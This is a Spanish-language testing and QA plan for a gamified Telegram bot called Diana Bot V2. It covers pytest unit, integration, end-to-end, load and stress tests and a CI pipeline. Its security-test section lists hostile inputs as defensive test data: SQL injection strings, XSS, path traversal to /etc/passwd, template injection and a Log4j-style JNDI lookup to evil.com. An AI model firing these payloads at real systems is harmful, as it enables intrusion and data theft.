# Diana Bot V2 - Plan de Testing y Quality Assurance

## 📋 Información del Documento

- **Producto**: Diana Bot V2
- **Versión**: 1.0
- **Fecha**: Agosto 2025
- **Basado en**: Technical Architecture Plan v1.0, User Stories v1.0
- **Audiencia**: QA Team, Development Team, Technical Leads

---

## 🎯 Objetivos de Testing

### Objetivos Primarios
1. **Functional Correctness**: Todas las funcionalidades trabajen según specifications
2. **Quality Assurance**: Experiencia de usuario consistente y libre de bugs
3. **Performance Validation**: Sistema mantenga performance bajo carga
4. **Security Assurance**: No vulnerabilidades de seguridad en producción
5. **Reliability Testing**: Sistema se recupere gracefully de failures
6. **Compatibility Testing**: Funcione en todos los devices y contexts

### Quality Gates
- **Code Coverage**: Mínimo 90% en business logic, 80% en total
- **Performance**: 95% de requests <2 segundos
- **Security**: Zero vulnerabilidades críticas o altas
- **Bug Rate**: <0.1% error rate en producción
- **User Satisfaction**: >4.5/5 rating en user feedback
- **Reliability**: 99.9% uptime en production

---

## 🧪 Estrategia de Testing Multinivel

### Testing Pyramid Architecture
```
                    🔺 E2E Tests (10%)
                   🔺🔺🔺 Integration Tests (20%)
              🔺🔺🔺🔺🔺🔺🔺 Unit Tests (70%)
```

### 1. Unit Testing (70% del esfuerzo de testing)

**Objetivo**: Testear componentes individuales en aislamiento  
**Coverage Target**: 95% líneas de código  
**Tools**: pytest, pytest-cov, pytest-mock

#### Testing Framework Setup
```python
# conftest.py - Configuración global de testing
import pytest
import asyncio
from unittest.mock import AsyncMock, MagicMock
from sqlalchemy.ext.asyncio import create_async_engine
from testcontainers.postgres import PostgresContainer
from testcontainers.redis import RedisContainer

@pytest.fixture(scope="session")
def event_loop():
    """Create an instance of the default event loop for the test session."""
    loop = asyncio.get_event_loop_policy().new_event_loop()
    yield loop
    loop.close()

@pytest.fixture(scope="session")
async def test_database():
    """Setup test database using testcontainers."""
    with PostgresContainer("postgres:15") as postgres:
        database_url = postgres.get_connection_url().replace("psycopg2", "asyncpg")
        engine = create_async_engine(database_url)
        # Run migrations
        await run_migrations(engine)
        yield engine
        await engine.dispose()

@pytest.fixture(scope="session")
async def test_redis():
    """Setup test Redis using testcontainers."""
    with RedisContainer("redis:7") as redis:
        redis_url = redis.get_connection_url()
        yield redis_url

@pytest.fixture
async def gamification_service(test_database, test_redis):
    """Create isolated GamificationService for testing."""
    service = GamificationService(
        database=test_database,
        redis_url=test_redis,
        event_bus=AsyncMock()
    )
    await service.initialize()
    yield service
    await service.cleanup()
```

#### Unit Test Examples
```python
class TestGamificationService:
    """Unit tests for GamificationService."""

    async def test_award_points_basic(self, gamification_service):
        """Test basic point awarding functionality."""
        # Given
        user_id = 12345
        action = "daily_login"
        expected_points = 50

        # When
        result = await gamification_service.award_points(
            user_id=user_id,
            action=action,
            amount=expected_points
        )

        # Then
        assert result.success is True
        assert result.points_awarded == expected_points
        assert result.new_balance == expected_points

        # Verify database state
        user_data = await gamification_service.get_user_data(user_id)
        assert user_data.total_points == expected_points

    async def test_award_points_with_vip_multiplier(self, gamification_service):
        """Test point awarding with VIP multiplier."""
        # Given
        user_id = 12345
        await gamification_service.set_vip_status(user_id, True)
        base_points = 100
        expected_points = 150  # 1.5x VIP multiplier

        # When
        result = await gamification_service.award_points(
            user_id=user_id,
            action="story_completion",
            amount=base_points
        )

        # Then
        assert result.points_awarded == expected_points
        assert result.vip_bonus_applied is True

    async def test_anti_abuse_rate_limiting(self, gamification_service):
        """Test rate limiting prevents point abuse."""
        # Given
        user_id = 12345
        action = "button_click"

        # When - Award points rapidly 10 times
        results = []
        for _ in range(10):
            result = await gamification_service.award_points(
                user_id=user_id,
                action=action,
                amount=10
            )
            results.append(result)

        # Then - First few succeed, later ones are rate limited
        successful_awards = [r for r in results if r.success]
        rate_limited_awards = [r for r in results if r.rate_limited]

        assert len(successful_awards) <= 3  # Max 3 rapid awards
        assert len(rate_limited_awards) > 0

    @pytest.mark.parametrize("streak_days,expected_multiplier", [
        (1, 1.0),
        (7, 1.1),
        (30, 1.3),
        (100, 1.5)
    ])
    async def test_streak_multipliers(self, gamification_service, streak_days, expected_multiplier):
        """Test streak multiplier calculations."""
        # Given
        user_id = 12345
        await gamification_service.set_user_streak(user_id, streak_days)
        base_points = 100

        # When
        result = await gamification_service.award_points(
            user_id=user_id,
            action="daily_activity",
            amount=base_points
        )

        # Then
        expected_total = int(base_points * expected_multiplier)
        assert result.points_awarded == expected_total
        assert result.streak_bonus_applied is True

class TestNarrativeService:
    """Unit tests for NarrativeService."""

    async def test_story_progression(self, narrative_service):
        """Test basic story progression."""
        # Given
        user_id = 12345
        chapter_id = 1

        # When
        result = await narrative_service.advance_chapter(user_id, chapter_id)

        # Then
        assert result.success is True
        assert result.new_chapter_id == chapter_id + 1

        # Verify user progress
        progress = await narrative_service.get_user_progress(user_id)
        assert chapter_id in progress.completed_chapters

    async def test_decision_impact_tracking(self, narrative_service):
        """Test that decisions impact future story content."""
        # Given
        user_id = 12345
        decision = Decision(
            chapter_id=1,
            choice_id="help_character",
            consequences={"character_trust": +10}
        )

        # When
        await narrative_service.process_decision(user_id, decision)

        # Then
        character_state = await narrative_service.get_character_relationship(
            user_id, "main_character"
        )
        assert character_state.trust_level >= 10

    async def test_vip_exclusive_content_access(self, narrative_service):
        """Test VIP users can access exclusive content."""
        # Given
        vip_user_id = 12345
        free_user_id = 67890
        vip_chapter_id = 999

        await narrative_service.set_vip_status(vip_user_id, True)

        # When
        vip_result = await narrative_service.get_chapter_content(vip_user_id, vip_chapter_id)
        free_result = await narrative_service.get_chapter_content(free_user_id, vip_chapter_id)

        # Then
        assert vip_result.success is True
        assert vip_result.content is not None
        assert free_result.success is False
        assert free_result.error == "vip_content_required"

class TestAdminService:
    """Unit tests for AdminService."""

    async def test_user_search_functionality(self, admin_service):
        """Test admin user search capabilities."""
        # Given
        test_users = [
            {"id": 123, "username": "testuser1", "email": "test1@example.com"},
            {"id": 456, "username": "testuser2", "email": "test2@example.com"}
        ]
        for user in test_users:
            await admin_service.create_test_user(user)

        # When
        search_results = await admin_service.search_users(query="testuser")

        # Then
        assert len(search_results) == 2
        assert all("testuser" in user.username for user in search_results)

    async def test_admin_permissions_enforcement(self, admin_service):
        """Test that admin permissions are properly enforced."""
        # Given
        regular_user_id = 12345
        admin_user_id = 67890
        super_admin_id = 99999

        await admin_service.set_user_role(admin_user_id, "admin")
        await admin_service.set_user_role(super_admin_id, "super_admin")

        # When & Then
        # Regular user cannot perform admin actions
        with pytest.raises(PermissionError):
            await admin_service.ban_user(regular_user_id, target_user=12346)

        # Admin can perform basic admin actions
        result = await admin_service.ban_user(admin_user_id, target_user=12346)
        assert result.success is True

        # Super admin can perform all actions
        result = await admin_service.delete_user_data(super_admin_id, target_user=12346)
        assert result.success is True
```

### 2. Integration Testing (20% del esfuerzo)

**Objetivo**: Testear interacción entre servicios y componentes  
**Coverage Target**: Todos los service boundaries  
**Tools**: pytest-asyncio, httpx, testcontainers

#### Integration Test Setup
```python
class TestServiceIntegration:
    """Integration tests between multiple services."""

    @pytest.fixture
    async def integrated_services(self, test_database, test_redis):
        """Setup integrated services environment."""
        event_bus = EventBus(redis_url=test_redis)

        gamification = GamificationService(
            database=test_database,
            event_bus=event_bus
        )

        narrative = NarrativeService(
            database=test_database,
            event_bus=event_bus
        )

        admin = AdminService(
            database=test_database,
            gamification_service=gamification,
            narrative_service=narrative
        )

        services = IntegratedServices(
            gamification=gamification,
            narrative=narrative,
            admin=admin,
            event_bus=event_bus
        )

        await services.initialize_all()
        yield services
        await services.cleanup_all()

    async def test_story_completion_awards_points(self, integrated_services):
        """Test that completing story chapters awards points via event bus."""
        # Given
        user_id = 12345
        chapter_id = 1
        expected_points = 150

        # When
        await integrated_services.narrative.complete_chapter(user_id, chapter_id)

        # Wait for event processing
        await asyncio.sleep(0.1)

        # Then
        user_points = await integrated_services.gamification.get_user_points(user_id)
        assert user_points >= expected_points

        # Verify event was published
        events = await integrated_services.event_bus.get_processed_events()
        story_events = [e for e in events if e.type == "story_chapter_completed"]
        assert len(story_events) == 1
        assert story_events[0].user_id == user_id

    async def test_achievement_unlock_triggers_notification(self, integrated_services):
        """Test achievement unlock triggers notification system."""
        # Given
        user_id = 12345

        # When - Award enough points to unlock first achievement
        await integrated_services.gamification.award_points(user_id, "test", 1000)

        # Wait for event processing
        await asyncio.sleep(0.1)

        # Then
        achievements = await integrated_services.gamification.get_user_achievements(user_id)
        assert len(achievements) > 0

        # Verify notification was triggered
        notifications = await integrated_services.get_pending_notifications(user_id)
        achievement_notifications = [n for n in notifications if n.type == "achievement_unlocked"]
        assert len(achievement_notifications) > 0

    async def test_admin_user_modification_affects_all_services(self, integrated_services):
        """Test admin modifications propagate across services."""
        # Given
        admin_id = 99999
        target_user_id = 12345
        await integrated_services.admin.set_user_role(admin_id, "super_admin")

        # Setup initial user state
        await integrated_services.gamification.award_points(target_user_id, "initial", 500)
        await integrated_services.narrative.start_story(target_user_id)

        # When - Admin suspends user
        await integrated_services.admin.suspend_user(admin_id, target_user_id)

        # Then - User should be suspended across all services
        gamification_status = await integrated_services.gamification.get_user_status(target_user_id)
        narrative_status = await integrated_services.narrative.get_user_status(target_user_id)

        assert gamification_status.is_suspended is True
        assert narrative_status.is_suspended is True
```

### 3. End-to-End Testing (10% del esfuerzo)

**Objetivo**: Testear flujos completos de usuario desde perspectiva externa  
**Coverage Target**: Todos los user journeys críticos  
**Tools**: playwright, selenium, custom telegram bot testing framework

#### E2E Testing Framework
```python
class TelegramBotTester:
    """Framework para testing end-to-end de Telegram bots."""

    def __init__(self, bot_token: str, test_environment: str):
        self.bot_token = bot_token
        self.test_environment = test_environment
        self.test_users = []

    async def create_test_user(self, user_data: dict) -> TestUser:
        """Create a test user for E2E testing."""
        test_user = TestUser(
            user_id=user_data["id"],
            username=user_data["username"],
            bot_client=TelegramTestClient(self.bot_token)
        )
        self.test_users.append(test_user)
        return test_user

    async def simulate_user_journey(self, test_user: TestUser, journey: UserJourney) -> JourneyResult:
        """Simulate complete user journey."""
        results = []

        for step in journey.steps:
            result = await self.execute_step(test_user, step)
            results.append(result)

            if not result.success:
                return JourneyResult(success=False, failed_step=step, results=results)

        return JourneyResult(success=True, results=results)

class TestCompleteUserJourneys:
    """E2E tests for complete user flows."""

    @pytest.fixture
    async def bot_tester(self):
        """Setup bot testing environment."""
        tester = TelegramBotTester(
            bot_token=os.getenv("TEST_BOT_TOKEN"),
            test_environment="staging"
        )
        yield tester
        await tester.cleanup()

    async def test_new_user_onboarding_flow(self, bot_tester):
        """Test complete onboarding flow for new user."""
        # Given
        test_user = await bot_tester.create_test_user({
            "id": 12345,
            "username": "testuser",
            "first_name": "Test"
        })

        onboarding_journey = UserJourney([
            SendCommand("/start"),
            ExpectMessage(contains="¡Bienvenida/o"),
            ClickButton("✨ Empezar aventura"),
            CompletePersonalityQuiz(answers=["explorer", "competitive", "social"]),
            CompleteTutorial(skip_sections=[]),
            ExpectMessage(contains="¡Tutorial completado!"),
            CheckUserState(onboarding_completed=True)
        ])

        # When
        result = await bot_tester.simulate_user_journey(test_user, onboarding_journey)

        # Then
        assert result.success is True

        # Verify final state
        user_profile = await bot_tester.get_user_profile(test_user.user_id)
        assert user_profile.onboarding_completed is True
        assert user_profile.archetype in ["explorer", "achiever", "social"]
        assert user_profile.tutorial_completed is True

    async def test_vip_subscription_purchase_flow(self, bot_tester):
        """Test VIP subscription purchase process."""
        # Given
        test_user = await bot_tester.create_test_user({
            "id": 67890,
            "username": "vipuser"
        })

        # Complete onboarding first
        await bot_tester.complete_onboarding(test_user)

        vip_journey = UserJourney([
            SendCommand("/start"),
            ClickButton("💎 Tienda VIP"),
            ClickButton("👑 Suscripción VIP - $9.99/mes"),
            ClickButton("💳 Comprar Ahora"),
            CompletePayment(card_number="4242424242424242"),
            ExpectMessage(contains="¡Bienvenido al club VIP!"),
            CheckUserState(vip_status=True)
        ])

        # When
        result = await bot_tester.simulate_user_journey(test_user, vip_journey)

        # Then
        assert result.success is True

        # Verify VIP benefits are active
        user_subscription = await bot_tester.get_user_subscription(test_user.user_id)
        assert user_subscription.plan_type == "vip"
        assert user_subscription.status == "active"

    async def test_story_progression_with_decisions(self, bot_tester):
        """Test narrative progression with decision making."""
        # Given
        test_user = await bot_tester.create_test_user({
            "id": 11111,
            "username": "storyteller"
        })

        await bot_tester.complete_onboarding(test_user)

        story_journey = UserJourney([
            SendCommand("/start"),
            ClickButton("📖 Continuar Historia"),
            ReadStoryContent(),
            MakeDecision("help_character"),
            ExpectCharacterReaction(positive=True),
            AdvanceToNextChapter(),
            MakeDecision("trust_ally"),
            CompleteChapter(),
            CheckProgress(chapters_completed=2)
        ])

        # When
        result = await bot_tester.simulate_user_journey(test_user, story_journey)

        # Then
        assert result.success is True

        # Verify story state
        story_progress = await bot_tester.get_story_progress(test_user.user_id)
        assert len(story_progress.completed_chapters) >= 2
        assert story_progress.character_relationships["main_character"].trust_level > 0

    async def test_admin_panel_functionality(self, bot_tester):
        """Test admin panel operations."""
        # Given
        admin_user = await bot_tester.create_test_user({
            "id": 99999,
            "username": "adminuser"
        })

        await bot_tester.set_user_role(admin_user.user_id, "admin")

        admin_journey = UserJourney([
            SendCommand("/admin"),
            AuthenticateAsAdmin(),
            ExpectMessage(contains="Panel de Administración"),
            ClickButton("👥 Gestión de Usuarios"),
            SearchUser("testuser"),
            ViewUserDetails(),
            ModifyUserPoints(amount=1000),
            ClickButton("📊 Dashboard"),
            ViewMetrics(),
            CheckMetricsDisplay()
        ])

        # When
        result = await bot_tester.simulate_user_journey(admin_user, admin_journey)

        # Then
        assert result.success is True
```

---

## 🚀 Performance Testing

### Load Testing Strategy
```python
class PerformanceTestSuite:
    """Performance and load testing suite."""

    async def test_concurrent_user_load(self):
        """Test system performance under concurrent load."""
        # Simulate 1000 concurrent users
        concurrent_users = 1000
        test_duration = 300  # 5 minutes

        async def simulate_user_activity(user_id: int):
            """Simulate realistic user activity."""
            activities = [
                lambda: self.send_command(user_id, "/start"),
                lambda: self.award_points(user_id, 50),
                lambda: self.get_leaderboard(user_id),
                lambda: self.advance_story(user_id),
                lambda: self.check_achievements(user_id)
            ]

            start_time = time.time()
            while time.time() - start_time < test_duration:
                activity = random.choice(activities)
                response_time = await self.measure_response_time(activity)
                self.record_performance_metric(response_time)
                await asyncio.sleep(random.uniform(1, 5))  # Realistic user pause

        # Run concurrent simulations
        tasks = [simulate_user_activity(i) for i in range(concurrent_users)]
        await asyncio.gather(*tasks)

        # Analyze results
        metrics = self.get_performance_metrics()
        assert metrics.average_response_time < 2.0  # < 2 seconds
        assert metrics.p95_response_time < 3.0      # 95th percentile < 3 seconds
        assert metrics.error_rate < 0.01            # < 1% error rate

    async def test_database_performance_under_load(self):
        """Test database performance with high query volume."""
        query_types = [
            "user_profile_lookup",
            "points_transaction_insert",
            "leaderboard_calculation",
            "achievement_check",
            "story_progress_update"
        ]

        # Execute 10,000 queries of each type
        for query_type in query_types:
            start_time = time.time()

            tasks = []
            for i in range(10000):
                task = self.execute_database_query(query_type, user_id=i)
                tasks.append(task)

            await asyncio.gather(*tasks)

            execution_time = time.time() - start_time
            qps = 10000 / execution_time  # Queries per second

            # Verify performance requirements
            assert qps > 100  # Minimum 100 queries per second
            print(f"{query_type}: {qps:.2f} QPS")

    async def test_memory_usage_under_load(self):
        """Test memory usage patterns under sustained load."""
        import psutil

        process = psutil.Process()
        initial_memory = process.memory_info().rss / 1024 / 1024  # MB

        # Run sustained load for 30 minutes
        load_duration = 1800  # 30 minutes
        start_time = time.time()

        while time.time() - start_time < load_duration:
            # Simulate various operations
            await self.simulate_user_activities(num_users=100)

            # Check memory every 60 seconds
            if int(time.time() - start_time) % 60 == 0:
                current_memory = process.memory_info().rss / 1024 / 1024
                memory_growth = current_memory - initial_memory

                # Alert if memory grows beyond reasonable limits
                assert memory_growth < 500  # < 500MB growth
                print(f"Memory usage: {current_memory:.2f} MB (+{memory_growth:.2f} MB)")

        # Check for memory leaks
        final_memory = process.memory_info().rss / 1024 / 1024
        total_growth = final_memory - initial_memory
        assert total_growth < 100  # < 100MB final growth indicates no major leaks
```

### Stress Testing
```python
class StressTestSuite:
    """Stress testing to find system breaking points."""

    async def test_find_maximum_concurrent_users(self):
        """Find the maximum number of concurrent users the system can handle."""
        max_users = 10000
        step_size = 100
        breaking_point = None

        for concurrent_users in range(100, max_users, step_size):
            print(f"Testing {concurrent_users} concurrent users...")

            try:
                # Test for 2 minutes
                success = await self.run_concurrent_load_test(
                    num_users=concurrent_users,
                    duration=120
                )

                if not success:
                    breaking_point = concurrent_users
                    break

            except Exception as e:
                print(f"System failed at {concurrent_users} users: {e}")
                breaking_point = concurrent_users
                break

        print(f"System breaking point: {breaking_point} concurrent users")

        # Verify system can handle target load (1000 users) with 50% safety margin
        assert breaking_point is None or breaking_point > 1500

    async def test_database_connection_limits(self):
        """Test database connection pool limits."""
        max_connections = 1000
        active_connections = []

        try:
            for i in range(max_connections):
                conn = await self.create_database_connection()
                active_connections.append(conn)

                # Test connection is usable
                await conn.execute("SELECT 1")

                if i % 100 == 0:
                    print(f"Created {i} connections...")

        except Exception as e:
            connection_limit = len(active_connections)
            print(f"Database connection limit reached at {connection_limit}: {e}")

            # Verify we can handle expected load
            assert connection_limit > 200  # Need at least 200 concurrent connections

        finally:
            # Cleanup connections
            for conn in active_connections:
                await conn.close()

    async def test_redis_performance_limits(self):
        """Test Redis cache performance under extreme load."""
        operations_per_second = 10000
        test_duration = 60  # 1 minute

        total_operations = operations_per_second * test_duration

        start_time = time.time()
        successful_operations = 0

        async def redis_operation():
            nonlocal successful_operations
            try:
                # Mix of Redis operations
                operation = random.choice([
                    lambda: self.redis_client.set(f"key_{random.randint(1,10000)}", "value"),
                    lambda: self.redis_client.get(f"key_{random.randint(1,10000)}"),
                    lambda: self.redis_client.incr(f"counter_{random.randint(1,100)}"),
                    lambda: self.redis_client.zadd("leaderboard", {f"user_{random.randint(1,1000)}": random.randint(1,10000)})
                ])

                await operation()
                successful_operations += 1

            except Exception as e:
                print(f"Redis operation failed: {e}")

        # Execute operations at target rate
        tasks = []
        for i in range(total_operations):
            task = redis_operation()
            tasks.append(task)

            # Control rate
            if i % operations_per_second == 0:
                await asyncio.sleep(1)

        await asyncio.gather(*tasks, return_exceptions=True)

        execution_time = time.time() - start_time
        actual_ops_per_second = successful_operations / execution_time

        print(f"Redis performance: {actual_ops_per_second:.2f} ops/second")
        print(f"Success rate: {successful_operations / total_operations * 100:.2f}%")

        # Verify Redis can handle target load
        assert actual_ops_per_second > 5000  # Minimum 5000 ops/second
        assert successful_operations / total_operations > 0.99  # 99% success rate
```

---

## 🔒 Security Testing

### Security Test Framework
```python
class SecurityTestSuite:
    """Comprehensive security testing suite."""

    async def test_sql_injection_vulnerabilities(self):
        """Test for SQL injection vulnerabilities."""
        injection_payloads = [
            "'; DROP TABLE users; --",
            "' OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES (999999, 'hacker'); --"
        ]

        test_endpoints = [
            "user_search",
            "user_profile_update",
            "admin_user_lookup",
            "story_decision_recording"
        ]

        for endpoint in test_endpoints:
            for payload in injection_payloads:
                try:
                    response = await self.send_malicious_input(endpoint, payload)

                    # Verify injection was not successful
                    assert "error" in response or response.get("status") == "invalid_input"
                    assert "users" not in str(response).lower()  # No data leaked

                except Exception as e:
                    # Proper error handling is expected
                    assert "invalid input" in str(e).lower() or "validation error" in str(e).lower()

    async def test_authentication_bypass_attempts(self):
        """Test for authentication bypass vulnerabilities."""
        bypass_attempts = [
            {"user_id": None, "token": "fake_token"},
            {"user_id": "admin", "token": None},
            {"user_id": 99999, "token": ""},
            {"user_id": "' OR 1=1 --", "token": "valid_token"}
        ]

        protected_endpoints = [
            "admin_dashboard",
            "user_management",
            "system_configuration",
            "financial_reports"
        ]

        for endpoint in protected_endpoints:
            for attempt in bypass_attempts:
                response = await self.attempt_unauthorized_access(endpoint, attempt)

                # Verify access was denied
                assert response.status_code in [401, 403]
                assert "unauthorized" in response.text.lower() or "forbidden" in response.text.lower()

    async def test_data_exposure_vulnerabilities(self):
        """Test for sensitive data exposure."""
        # Test user profile data privacy
        user1_id = 12345
        user2_id = 67890

        # User 1 should not be able to access User 2's data
        response = await self.get_user_profile(requesting_user=user1_id, target_user=user2_id)

        assert response.status_code == 403
        assert "user_id" not in response.json()
        assert "email" not in response.json()

        # Test admin data in error messages
        try:
            await self.trigger_database_error()
        except Exception as e:
            error_message = str(e)

            # Verify no sensitive data in error messages
            assert "password" not in error_message.lower()
            assert "token" not in error_message.lower()
            assert "database_url" not in error_message.lower()

    async def test_rate_limiting_enforcement(self):
        """Test rate limiting prevents abuse."""
        user_id = 12345

        # Test API rate limiting
        requests_per_minute = 100
        for i in range(requests_per_minute + 10):
            response = await self.make_api_request(user_id, "/gamification/award_points")

            if i < requests_per_minute:
                assert response.status_code == 200
            else:
                # Should be rate limited
                assert response.status_code == 429
                assert "rate limit" in response.text.lower()

        # Test login attempt rate limiting
        for i in range(10):
            response = await self.attempt_admin_login("wrong_password")

            if i < 5:
                assert response.status_code in [401, 403]
            else:
                # Should be locked out after 5 attempts
                assert response.status_code == 429
                assert "locked" in response.text.lower() or "rate limit" in response.text.lower()

    async def test_input_validation_security(self):
        """Test input validation prevents malicious input."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "javascript:alert('xss')",
            "../../etc/passwd",
            "\\x00\\x00\\x00",
            "A" * 10000,  # Buffer overflow attempt
            "{{7*7}}",     # Template injection
            "${jndi:ldap://evil.com/exploit}"  # Log4j style injection
        ]

        input_fields = [
            "username",
            "message_content",
            "story_decision_text",
            "achievement_description"
        ]

        for field in input_fields:
            for malicious_input in malicious_inputs:
                response = await self.submit_input(field, malicious_input)

                # Verify input was sanitized or rejected
                assert response.get("status") != "success" or malicious_input not in response.get("data", "")

                # Check stored data is clean
                stored_data = await self.get_stored_field_value(field)
                assert malicious_input not in str(stored_data)
```

---

## 📊 Test Automation & CI/CD Integration

### Automated Testing Pipeline
```yaml
# .github/workflows/test.yml
name: Comprehensive Testing Pipeline

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: testpass
          POSTGRES_DB: diana_test
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

    steps:
    - uses: actions/checkout@v3

    - name: Set up Python
      uses: actions/setup-python@v4
      with:
        python-version: '3.11'

    - name: Install dependencies
      run: |
        pip install -r requirements.txt
        pip install -r requirements-test.txt

    - name: Run unit tests with coverage
      run: |
        pytest tests/unit/ \
          --cov=src \
          --cov-report=xml \
          --cov-report=html \
          --cov-fail-under=90 \
          --junitxml=test-results.xml

    - name: Upload coverage to Codecov
      uses: codecov/codecov-action@v3
      with:
        file: ./coverage.xml

    - name: Store test results
      uses: actions/upload-artifact@v3
      with:
        name: test-results
        path: test-results.xml

  integration-tests:
    runs-on: ubuntu-latest
    needs: unit-tests

    steps:
    - uses: actions/checkout@v3

    - name: Set up test environment
      run: |
        docker-compose -f docker-compose.test.yml up -d
        sleep 30  # Wait for services to be ready

    - name: Run integration tests
      run: |
        pytest tests/integration/ \
          --junitxml=integration-results.xml

    - name: Cleanup
      run: |
        docker-compose -f docker-compose.test.yml down

  security-tests:
    runs-on: ubuntu-latest
    needs: unit-tests

    steps:
    - uses: actions/checkout@v3

    - name: Run security tests
      run: |
        pytest tests/security/ \
          --junitxml=security-results.xml

    - name: Run SAST scan
      uses: github/super-linter@v4
      env:
        DEFAULT_BRANCH: main
        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        VALIDATE_PYTHON_PYLINT: true
        VALIDATE_PYTHON_BANDIT: true

  performance-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    if: github.ref == 'refs/heads/main'

    steps:
    - uses: actions/checkout@v3

    - name: Set up performance test environment
      run: |
        docker-compose -f docker-compose.perf.yml up -d
        sleep 60  # Wait for full startup

    - name: Run performance tests
      run: |
        pytest tests/performance/ \
          --timeout=1800 \
          --junitxml=performance-results.xml

    - name: Generate performance report
      run: |
        python scripts/generate_performance_report.py

    - name: Upload performance artifacts
      uses: actions/upload-artifact@v3
      with:
        name: performance-results
        path: performance-report.html

  e2e-tests:
    runs-on: ubuntu-latest
    needs: integration-tests
    if: github.ref == 'refs/heads/main'

    steps:
    - uses: actions/checkout@v3

    - name: Deploy to staging
      run: |
        ./scripts/deploy_staging.sh

    - name: Run E2E tests
      run: |
        pytest tests/e2e/ \
          --staging-url=${{ secrets.STAGING_URL }} \
          --bot-token=${{ secrets.TEST_BOT_TOKEN }} \
          --junitxml=e2e-results.xml

    - name: Cleanup staging
      if: always()
      run: |
        ./scripts/cleanup_staging.sh
```

### Test Quality Metrics Dashboard
```python
class TestQualityDashboard:
    """Dashboard para monitoring test quality y coverage."""

    def generate_test_report(self) -> TestReport:
        """Generate comprehensive test quality report."""
        return TestReport(
            coverage_metrics=self.get_coverage_metrics(),
            performance_benchmarks=self.get_performance_benchmarks(),
            security_scan_results=self.get_security_results(),
            flaky_test_analysis=self.analyze_flaky_tests(),
            test_execution_trends=self.get_execution_trends()
        )

    def get_coverage_metrics(self) -> CoverageMetrics:
        """Analyze test coverage across different dimensions."""
        return CoverageMetrics(
            line_coverage=92.5,
            branch_coverage=88.3,
            function_coverage=95.1,
            critical_path_coverage=100.0,
            integration_coverage=85.7
        )

    def analyze_flaky_tests(self) -> FlakeAnalysis:
        """Identify and analyze flaky tests."""
        flaky_tests = self.identify_flaky_tests()

        return FlakeAnalysis(
            total_flaky_tests=len(flaky_tests),
            flake_rate=len(flaky_tests) / self.total_tests * 100,
            most_flaky_components=self.get_flakiest_components(),
            recommended_fixes=self.suggest_flaky_test_fixes()
        )
```

---

## 📈 Test Metrics & KPIs

### Test Quality KPIs
```python
TEST_QUALITY_TARGETS = {
    # Coverage Targets
    "unit_test_coverage": 90,           # % line coverage
    "integration_coverage": 80,         # % service boundary coverage
    "critical_path_coverage": 100,      # % business critical flows

    # Performance Targets
    "test_execution_time": 300,         # Total test suite < 5 minutes
    "test_flake_rate": 1,               # < 1% flaky tests
    "test_maintenance_overhead": 20,    # < 20% dev time on test maintenance

    # Quality Targets
    "bug_escape_rate": 0.1,             # < 0.1% bugs escape to production
    "security_vulnerability_rate": 0,    # Zero security vulnerabilities
    "performance_regression_rate": 5,    # < 5% performance regressions

    # Business Impact Targets
    "user_reported_bugs": 10,           # < 10 user-reported bugs per month
    "uptime_sla": 99.9,                 # > 99.9% uptime
    "customer_satisfaction": 4.5         # > 4.5/5 user satisfaction
}
```

### Continuous Quality Improvement
```python
class QualityImprovementEngine:
    """Engine para continuous improvement de test quality."""

    async def analyze_test_effectiveness(self) -> EffectivenessReport:
        """Analyze how effective our tests are at catching bugs."""
        production_bugs = await self.get_production_bugs()
        test_coverage = await self.get_test_coverage()

        effectiveness_score = self.calculate_effectiveness(production_bugs, test_coverage)

        return EffectivenessReport(
            effectiveness_score=effectiveness_score,
            gaps_identified=self.identify_coverage_gaps(production_bugs),
            recommended_tests=self.suggest_new_tests(),
            priority_areas=self.prioritize_test_improvements()
        )

    async def optimize_test_suite(self) -> OptimizationPlan:
        """Optimize test suite for maximum value with minimum execution time."""
        test_execution_data = await self.get_test_execution_analytics()

        return OptimizationPlan(
            tests_to_parallelize=self.identify_parallelization_opportunities(),
            redundant_tests=self.find_redundant_tests(),
            slow_tests_to_optimize=self.find_slow_tests(),
            suggested_test_priorities=self.prioritize_critical_tests()
        )
```

---

## 🔄 Test Maintenance Strategy

### Test Data Management
```python
class TestDataManager:
    """Manage test data across different test types."""

    async def setup_test_data(self, test_type: str) -> TestDataSet:
        """Setup appropriate test data for different test types."""
        if test_type == "unit":
            return await self.create_isolated_test_data()
        elif test_type == "integration":
            return await self.create_service_test_data()
        elif test_type == "e2e":
            return await self.create_realistic_test_data()

    async def cleanup_test_data(self, test_data_id: str) -> None:
        """Clean up test data after test execution."""
        await self.database.delete_test_data(test_data_id)
        await self.redis.delete_test_cache(test_data_id)
        await self.file_system.delete_test_files(test_data_id)

    async def maintain_test_data_freshness(self) -> None:
        """Keep test data fresh and representative."""
        await self.update_user_personas()
        await self.refresh_content_samples()
        await self.update_performance_baselines()
```

### Test Environment Management
```python
class TestEnvironmentManager:
    """Manage test environments and their lifecycle."""

    async def provision_test_environment(self, config: TestEnvConfig) -> TestEnvironment:
        """Provision isolated test environment."""
        environment = TestEnvironment(
            database=await self.create_test_database(),
            redis=await self.create_test_redis(),
            services=await self.deploy_test_services(config),
            network=await self.create_isolated_network()
        )

        await environment.initialize()
        return environment

    async def maintain_environment_health(self, env: TestEnvironment) -> HealthStatus:
        """Monitor and maintain test environment health."""
        health_checks = [
            self.check_database_health(env.database),
            self.check_service_health(env.services),
            self.check_network_connectivity(env.network),
            self.check_resource_usage(env)
        ]

        results = await asyncio.gather(*health_checks)
        return HealthStatus(checks=results, overall_healthy=all(results))
```

---

**Plan de Testing Vivo**: Esta estrategia será continuamente refinada basada en discoveries durante testing, production issues, y evolving quality requirements.

**Próxima Revisión**: Cada sprint retrospective y cuando quality metrics indiquen need para strategy adjustments.
